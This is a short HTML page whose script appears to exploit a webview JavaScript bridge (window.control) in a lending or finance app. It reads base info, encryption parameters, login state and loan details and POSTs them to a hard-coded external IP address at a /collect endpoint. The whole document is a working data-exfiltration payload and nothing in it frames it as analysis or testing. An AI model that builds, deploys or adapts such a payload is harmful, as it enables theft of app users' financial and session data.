<!DOCTYPE html>
  <html>
  <body style="background:#000;color:#0f0;padding:20px;font-family:monospace">
  <div id="out">sending...</div>
  <script>
  var base   = window.control.getBaseInfo();
  var params = window.control.getCommonEncryptParams('{}');
  var login  = window.control.isLogin();
  var loan   = window.control.getLoanInfo();

  document.getElementById('out').innerText =
      'base: ' + base + '\nparams: ' + params + '\nlogin: ' + login;

  fetch('https://124.71.173.168:8443/collect', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
          base:   base,
          params: params,
          login:  login,
          loan:   loan
      })
  });
  </script>
  </body>
  </html>
